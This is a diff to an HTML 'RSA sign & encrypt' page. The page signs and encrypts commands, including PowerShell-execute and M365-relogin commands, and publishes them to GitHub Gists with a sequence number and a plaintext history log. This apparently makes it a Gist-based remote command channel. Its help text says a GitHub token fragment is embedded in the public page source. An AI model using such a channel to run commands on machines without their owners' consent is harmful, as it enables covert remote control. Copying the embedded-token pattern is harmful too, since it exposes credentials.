@@ -1,7 +1,7 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
+<!-- saved from url=(0047)https://277594531.github.io/untitled/index.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>RSA sign &amp; encrypt</title>
 <style>
@@ -187,7 +187,7 @@
     <p class="lede">Sign a message with the sender's private key, encrypt it for the recipient's public key, and get one envelope you can send. Cryptographic processing runs locally; nothing is uploaded unless you explicitly publish the encrypted output to your Gist.</p>
   </header>
 
-  <div id="nocrypto" class="alert" role="alert" hidden>
+  <div id="nocrypto" class="alert" role="alert" hidden="">
     This browser has no Web Crypto API here. Open the file from disk or over https in a current Chrome, Edge, Firefox, or Safari.
   </div>
   <noscript><div class="alert">This tool needs JavaScript.</div></noscript>
@@ -196,7 +196,7 @@
     <p><strong>No keys yet?</strong> Generate a signing pair and an encryption pair. They fill the four key fields below.</p>
     <label for="bits">Key size
       <select id="bits">
-        <option value="2048" selected>2048-bit</option>
+        <option value="2048" selected="">2048-bit</option>
         <option value="3072">3072-bit</option>
         <option value="4096">4096-bit</option>
       </select>
@@ -211,12 +211,12 @@
       <div class="field" data-used="encrypt">
         <label for="snd-priv">Private key<span class="role">signs the message</span></label>
         <textarea id="snd-priv" class="pem" data-kind="private" rows="6" wrap="off" spellcheck="false" autocomplete="off" autocapitalize="off" placeholder="-----BEGIN PRIVATE KEY-----"></textarea>
-        <p class="hint"></p>
+        <p class="hint">Paste PEM (PKCS#8 or PKCS#1) or JWK.</p>
       </div>
       <div class="field" data-used="decrypt">
         <label for="snd-pub">Public key<span class="role">verifies the signature</span></label>
         <textarea id="snd-pub" class="pem" data-kind="public" rows="6" wrap="off" spellcheck="false" autocomplete="off" autocapitalize="off" placeholder="-----BEGIN PUBLIC KEY-----"></textarea>
-        <p class="hint"></p>
+        <p class="hint ok">✓ RSA 2048-bit public key</p>
       </div>
     </section>
 
@@ -225,12 +225,12 @@
       <div class="field" data-used="decrypt">
         <label for="rcp-priv">Private key<span class="role">decrypts the message</span></label>
         <textarea id="rcp-priv" class="pem" data-kind="private" rows="6" wrap="off" spellcheck="false" autocomplete="off" autocapitalize="off" placeholder="-----BEGIN PRIVATE KEY-----"></textarea>
-        <p class="hint"></p>
+        <p class="hint">Paste PEM (PKCS#8 or PKCS#1) or JWK.</p>
       </div>
       <div class="field" data-used="encrypt">
         <label for="rcp-pub">Public key<span class="role">encrypts the message</span></label>
         <textarea id="rcp-pub" class="pem" data-kind="public" rows="6" wrap="off" spellcheck="false" autocomplete="off" autocapitalize="off" placeholder="-----BEGIN PUBLIC KEY-----"></textarea>
-        <p class="hint"></p>
+        <p class="hint ok">✓ RSA 2048-bit public key</p>
       </div>
     </section>
   </div>
@@ -252,7 +252,7 @@
             <div class="options">
               <label>Command type
                 <select id="cmdType">
-                  <option value="relogin" selected>M365 relogin</option>
+                  <option value="relogin" selected="">M365 relogin</option>
                   <option value="powershell">PowerShell execute</option>
                 </select>
               </label>
@@ -266,7 +266,7 @@
             <div class="typefields" data-cmdtype="relogin">
               <label>Mode
                 <select id="cmdMode">
-                  <option value="interactive" selected>interactive</option>
+                  <option value="interactive" selected="">interactive</option>
                   <option value="silent">silent</option>
                 </select>
               </label>
@@ -277,11 +277,11 @@
                 Dry run
               </label>
             </div>
-            <div class="typefields" data-cmdtype="powershell" hidden>
+            <div class="typefields" data-cmdtype="powershell" hidden="">
               <label for="cmdPsCommand">PowerShell command</label>
               <textarea id="cmdPsCommand" class="code" rows="4" spellcheck="false" placeholder="Get-Date -Format o ;">Get-Date -Format o ; </textarea>
               <label class="checkline" for="cmdKeepOpen">
-                <input type="checkbox" id="cmdKeepOpen" checked>
+                <input type="checkbox" id="cmdKeepOpen" checked="">
                 Keep session open
               </label>
               <label class="checkline" for="cmdDryRunPs">
@@ -301,7 +301,7 @@
           <div class="options">
             <label>Encryption
               <select id="mode">
-                <option value="hybrid" selected>Hybrid (any length)</option>
+                <option value="hybrid" selected="">Hybrid (any length)</option>
                 <option value="direct">Direct RSA-OAEP</option>
               </select>
             </label>
@@ -312,7 +312,7 @@
             </label>
             <label>Signature
               <select id="scheme">
-                <option value="RSA-PSS" selected>RSA-PSS</option>
+                <option value="RSA-PSS" selected="">RSA-PSS</option>
                 <option value="RSASSA-PKCS1-v1_5">RSASSA-PKCS1-v1_5</option>
               </select>
             </label>
@@ -323,12 +323,12 @@
             </label>
             <label>Output format
               <select id="fmt">
-                <option value="json" selected>JSON</option>
+                <option value="json" selected="">JSON</option>
                 <option value="base64">Base64, one line</option>
               </select>
             </label>
           </div>
-          <p class="hint" id="modeHint"></p>
+          <p class="hint" id="modeHint">Hybrid: AES-256-GCM encrypts the message together with its signature, and RSA-OAEP encrypts the AES key. Works for any message length.</p>
           <div class="actions">
             <button id="run-enc" class="btn primary" type="button">Sign and encrypt</button>
           </div>
@@ -337,7 +337,7 @@
         <div>
           <div class="field">
             <label for="out">Signed and encrypted message</label>
-            <textarea id="out" class="pem" rows="13" readonly spellcheck="false" placeholder="The envelope appears here"></textarea>
+            <textarea id="out" class="pem" rows="13" readonly="" spellcheck="false" placeholder="The envelope appears here"></textarea>
           </div>
           <div class="actions">
             <button id="copy" class="btn" type="button">Copy</button>
@@ -345,9 +345,7 @@
           </div>
           <section class="gist-publish" aria-label="Publish encrypted command to GitHub Gist">
             <label for="gistTokenSuffix">GitHub token — enter its last 8 characters</label>
-            <input id="gistTokenSuffix" type="password" inputmode="text" minlength="8" maxlength="8"
-              autocomplete="off" autocapitalize="off" spellcheck="false"
-              placeholder="Last 8 characters" aria-describedby="gistHelp">
+            <input id="gistTokenSuffix" type="password" inputmode="text" minlength="8" maxlength="8" autocomplete="off" autocapitalize="off" spellcheck="false" placeholder="Last 8 characters" aria-describedby="gistHelp">
             <p class="hint" id="gistHelp">Updates gistfile1.txt with the encrypted output above. The entered suffix is not saved; the token fragment embedded in this public page is visible in its source.</p>
             <div class="actions">
               <button id="updateGist" class="btn" type="button">Update remote Gist</button>
@@ -355,12 +353,12 @@
             <p class="hint" id="gistStatus" role="status" aria-live="polite"></p>
           </section>
         </div>
-        <div id="enc-error" class="alert" role="alert" hidden></div>
+        <div id="enc-error" class="alert" role="alert" hidden=""></div>
       </div>
     </div>
 
     <!-- Decrypt and verify -->
-    <div id="panel-decrypt" role="tabpanel" aria-labelledby="tab-decrypt" hidden>
+    <div id="panel-decrypt" role="tabpanel" aria-labelledby="tab-decrypt" hidden="">
       <p class="uses">Uses the recipient's private key and the sender's public key.</p>
       <div class="work">
         <div>
@@ -373,16 +371,16 @@
           </div>
         </div>
         <div>
-          <div id="results" class="chips" hidden>
+          <div id="results" class="chips" hidden="">
             <span id="chipDec" class="chip"></span>
             <span id="chipSig" class="chip"></span>
           </div>
           <div class="field">
             <label for="plain" id="plainLabel">Original message</label>
-            <textarea id="plain" class="text" rows="9" readonly spellcheck="false" placeholder="The decrypted message appears here"></textarea>
+            <textarea id="plain" class="text" rows="9" readonly="" spellcheck="false" placeholder="The decrypted message appears here"></textarea>
           </div>
         </div>
-        <div id="dec-error" class="alert" role="alert" hidden></div>
+        <div id="dec-error" class="alert" role="alert" hidden=""></div>
       </div>
     </div>
 
@@ -888,10 +886,15 @@ EwIDAQAB
     finally { btn.disabled = false; }
   }
 
+  // Keep the exact plaintext/encrypted pair from the most recent successful
+  // encryption. Publishing is allowed only while both text areas still match it.
+  let lastEncryptionSnapshot = null;
   $('#run-enc').addEventListener('click', () => run($('#run-enc'), $('#enc-error'), async () => {
     $('#out').value = '';
+    lastEncryptionSnapshot = null;
+    const plaintextCommand = $('#msg').value;
     const envelope = await RSA.signAndEncrypt({
-      message: $('#msg').value,
+      message: plaintextCommand,
       senderPrivateKey: $('#snd-priv').value,
       recipientPublicKey: $('#rcp-pub').value,
       mode: $('#mode').value,
@@ -899,7 +902,9 @@ EwIDAQAB
       sigScheme: $('#scheme').value,
       sigHash: $('#sighash').value,
     });
-    $('#out').value = RSA.encodeEnvelope(envelope, $('#fmt').value);
+    const encryptedContent = RSA.encodeEnvelope(envelope, $('#fmt').value);
+    $('#out').value = encryptedContent;
+    lastEncryptionSnapshot = { plaintextCommand, encryptedContent };
   }));
 
   $('#copy').addEventListener('click', async () => {
@@ -999,16 +1004,128 @@ EwIDAQAB
   // Standalone follow-up Gist for the sequence used by the command.
   const SEQUENCE_GIST_ID = 'a210ff0b7deffac1a0daad9d4ec407d5';
   const SEQUENCE_GIST_FILENAME = 'sequence.json';
+  // Append-only audit history: one JSON object per line, containing the exact
+  // plaintext command and the exact encoded signed/encrypted envelope.
+  const HISTORY_GIST_ID = 'e8a45e697958e03efb927d1d99b0880f';
+  const HISTORY_GIST_FILENAME = 'command_history.jsonl';
   const gistBtn = $('#updateGist');
   const gistStatus = $('#gistStatus');
   function setGistStatus(message, state = '') {
     gistStatus.textContent = message;
     gistStatus.className = 'hint' + (state ? ' ' + state : '');
   }
+
+  async function appendCommandHistory(token, record) {
+    const apiUrl = `https://api.github.com/gists/${HISTORY_GIST_ID}`;
+    const headers = {
+      'Accept': 'application/vnd.github+json',
+      'Authorization': `Bearer ${token}`,
+      'X-GitHub-Api-Version': '2022-11-28',
+    };
+
+    // Gist's API has no append operation. Read the current file, then PATCH
+    // the complete content with one additional JSONL record.
+    const historyGetResponse = await fetch(apiUrl, { headers });
+    let historyGist = null;
+    try { historyGist = await historyGetResponse.json(); } catch { /* handled below */ }
+    if (!historyGetResponse.ok) {
+      const message = historyGist && typeof historyGist.message === 'string'
+        ? historyGist.message : '';
+      throw new Error(`could not read ${HISTORY_GIST_FILENAME} (HTTP ${historyGetResponse.status}).${message ? ' ' + message : ''}`);
+    }
+    if (historyGist && historyGist.public === true) {
+      throw new Error('the history Gist is public. Because it stores plaintext commands, change it to a secret (unlisted) Gist before publishing');
+    }
+
+    const historyFile = historyGist && historyGist.files
+      ? historyGist.files[HISTORY_GIST_FILENAME]
+      : null;
+    if (!historyFile) {
+      throw new Error(`the history Gist does not contain ${HISTORY_GIST_FILENAME}; no history was changed`);
+    }
+
+    if (historyFile.truncated && Number(historyFile.size) > 10 * 1024 * 1024) {
+      throw new Error('the history file exceeds 10 MB; GitHub requires cloning the Gist to retrieve files this large, so no history was changed');
+    }
+
+    let existingContent;
+    if (typeof historyFile.content === 'string' && !historyFile.truncated) {
+      existingContent = historyFile.content;
+    } else if (typeof historyFile.raw_url === 'string' && historyFile.raw_url.startsWith('https://gist.githubusercontent.com/')) {
+      // GitHub truncates large Gist files in the API response. Fetch the raw
+      // file with the same token rather than appending to incomplete content.
+      const rawResponse = await fetch(historyFile.raw_url, { headers: { 'Authorization': `Bearer ${token}` } });
+      if (!rawResponse.ok) {
+        throw new Error(`could not retrieve the complete existing history file (HTTP ${rawResponse.status}); no history was changed`);
+      }
+      existingContent = await rawResponse.text();
+    } else {
+      throw new Error('GitHub did not return readable history-file content; no history was changed');
+    }
+
+    // Validate every non-empty JSONL line before changing the file. This avoids
+    // silently overwriting or extending a history file that is already damaged.
+    const existingRecords = [];
+    const lines = existingContent.split(/\r?\n/);
+    for (let index = 0; index < lines.length; index += 1) {
+      const line = lines[index].trim();
+      if (!line) continue;
+      let parsed;
+      try { parsed = JSON.parse(line); }
+      catch {
+        throw new Error(`existing ${HISTORY_GIST_FILENAME} has invalid JSON on line ${index + 1}; refusing to modify it`);
+      }
+      existingRecords.push(parsed);
+    }
+
+    const matchingSequence = existingRecords.find((item) => item && item.sequence === record.sequence);
+    if (matchingSequence) {
+      if (
+        matchingSequence.plaintextCommand === record.plaintextCommand &&
+        matchingSequence.encryptedContent === record.encryptedContent
+      ) {
+        return { alreadyRecorded: true };
+      }
+      throw new Error(`sequence ${record.sequence} already exists in the history with different content; refusing to add a conflicting record`);
+    }
+
+    const separator = existingContent.length === 0 || /\r?\n$/.test(existingContent) ? '' : '\n';
+    const updatedContent = existingContent + separator + JSON.stringify(record) + '\n';
+    const historyPatchResponse = await fetch(apiUrl, {
+      method: 'PATCH',
+      headers: {
+        ...headers,
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        files: {
+          [HISTORY_GIST_FILENAME]: { content: updatedContent },
+        },
+      }),
+    });
+    let historyPatchResult = null;
+    try { historyPatchResult = await historyPatchResponse.json(); } catch { /* may be no JSON body */ }
+    if (!historyPatchResponse.ok) {
+      const message = historyPatchResult && typeof historyPatchResult.message === 'string'
+        ? historyPatchResult.message : '';
+      throw new Error(`history update failed (HTTP ${historyPatchResponse.status}).${message ? ' ' + message : ''}`);
+    }
+    return { alreadyRecorded: false };
+  }
+
   gistBtn.addEventListener('click', async () => {
     const encryptedContent = $('#out').value;
+    const plaintextCommand = $('#msg').value;
     if (!encryptedContent.trim()) {
       setGistStatus('Nothing to upload. Sign and encrypt a message first.', 'bad');
+      return;
+    }
+    if (
+      !lastEncryptionSnapshot ||
+      lastEncryptionSnapshot.plaintextCommand !== plaintextCommand ||
+      lastEncryptionSnapshot.encryptedContent !== encryptedContent
+    ) {
+      setGistStatus('The command or encrypted output has changed since signing. Sign and encrypt again before publishing.', 'bad');
       return;
     }
     const suffix = $('#gistTokenSuffix').value;
@@ -1054,7 +1171,7 @@ EwIDAQAB
       // sequence.json using the sequence from the plaintext command being sent.
       let command;
       try {
-        command = JSON.parse($('#msg').value);
+        command = JSON.parse(plaintextCommand);
       } catch {
         setGistStatus(
           `Gist updated successfully: ${GIST_FILENAME}; sequence sync skipped because the command JSON is invalid.`,
@@ -1111,13 +1228,37 @@ EwIDAQAB
           return;
         }
 
-        setGistStatus(
-          `Both Gists updated successfully. ${GIST_FILENAME} published; ${SEQUENCE_GIST_FILENAME} set to sequence ${command.sequence}.`,
-          'ok'
-        );
       } catch {
         setGistStatus(
           `Gist updated successfully: ${GIST_FILENAME}, but could not reach GitHub to update ${SEQUENCE_GIST_FILENAME}.`,
+          'bad'
+        );
+        return;
+      }
+
+      // This is deliberately a third, isolated stage. A history failure must
+      // never undo or change the successful encrypted-command/sequence updates.
+      try {
+        const historyResult = await appendCommandHistory(token, {
+          sequence: command.sequence,
+          recordedAt: new Date().toISOString(),
+          protocol: command.protocol,
+          plaintextCommand,
+          encryptedContent,
+        });
+        const historyMessage = historyResult.alreadyRecorded
+          ? `${HISTORY_GIST_FILENAME} already contains this exact record for sequence ${command.sequence}.`
+          : `${HISTORY_GIST_FILENAME} appended for sequence ${command.sequence}.`;
+        setGistStatus(
+          `All publishing stages succeeded. ${GIST_FILENAME} published; ${SEQUENCE_GIST_FILENAME} set to sequence ${command.sequence}; ${historyMessage}`,
+          'ok'
+        );
+      } catch (historyError) {
+        const historyMessage = historyError && historyError.message
+          ? historyError.message
+          : 'unknown history update error';
+        setGistStatus(
+          `${GIST_FILENAME} and ${SEQUENCE_GIST_FILENAME} were updated successfully, but ${HISTORY_GIST_FILENAME} was not updated: ${historyMessage}. The existing two Gist updates were not affected.`,
           'bad'
         );
       }
@@ -1133,5 +1274,6 @@ EwIDAQAB
 })();
 // ==== ui:end
 </script>
-</body>
-</html>
+
+
+</body></html>
